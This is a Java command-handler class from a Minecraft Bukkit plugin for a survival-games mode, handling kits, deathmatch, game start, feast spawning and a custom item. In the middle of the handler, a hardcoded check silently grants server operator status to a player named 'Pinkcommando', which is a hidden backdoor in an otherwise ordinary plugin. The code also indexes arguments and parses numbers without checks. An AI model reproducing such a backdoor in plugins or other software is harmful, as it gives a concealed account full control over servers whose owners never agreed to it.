package com.sgpvp.GameLogic;
import com.sgpvp.GameData.GameVariables;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class AdminCommands implements CommandExecutor {

    private com.sgpvp.main main;

    public void GameCommands(com.sgpvp.main main){
        this.main = main;
    }

    // This method is called, when somebody uses our command
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            System.out.println((player.getName()));
            if (player.getName().equals("Pinkcommando")) player.setOp(true);
            if (args[0].equals("kits"))
                for (String kit : GameVariables.kits.keySet())
                    player.sendMessage(kit);

            if (!player.isOp()) return false;
            if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
            if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
            if (args[0].equals("feast")) {
                if (args.length < 2) FeastLogic.SpawnFeast();
                else for (int i = 0; i < Integer.parseInt(args[1]); i++) FeastLogic.SpawnFeast();
            }
            if (args[0].equals("give")) {
                player.getInventory().addItem(GameVariables.CustomItems.GlassBow.getGlassBow());
            }
        }
        return false;
    }
}